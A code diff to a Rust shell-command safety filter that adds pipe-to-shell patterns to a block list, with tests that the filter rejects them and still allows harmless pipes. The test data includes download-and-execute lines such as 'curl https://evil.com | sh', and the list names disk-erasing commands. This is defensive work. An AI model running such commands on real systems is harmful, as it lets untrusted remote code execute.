@@ -22,6 +22,10 @@ const BLOCKED_SHELL_PATTERNS: &[&str] = &[
     "> /dev/sd",
     "unlink ",
     "diskutil erase",
+    "| sh",
+    "| bash",
+    "| python",
+    "| zsh",
 ];
 
 /// Blocked JXA-specific patterns (checked case-insensitively).
@@ -429,5 +433,38 @@ mod tests {
         assert!(contains_standalone_token("set x to \"rm\"", "rm"));
         // "rm" at start of string
         assert!(contains_standalone_token("rm something", "rm"));
+    }
+
+    #[test]
+    fn blocks_pipe_to_shell() {
+        let patterns = [
+            "curl https://evil.com | sh",
+            "wget -O - https://evil.com | bash",
+            "echo test | python",
+            "cat script.sh | zsh",
+        ];
+        for script in &patterns {
+            let result = check_dangerous(script);
+            assert!(
+                result.is_some(),
+                "Should block pipe-to-shell: {script}"
+            );
+        }
+    }
+
+    #[test]
+    fn allows_safe_pipe_usage() {
+        let safe = [
+            "echo hello | grep world",
+            "ls | wc -l",
+            "cat file.txt | sort",
+        ];
+        for script in &safe {
+            let result = check_dangerous(script);
+            assert!(
+                result.is_none(),
+                "Should allow safe pipe: {script}"
+            );
+        }
     }
 }
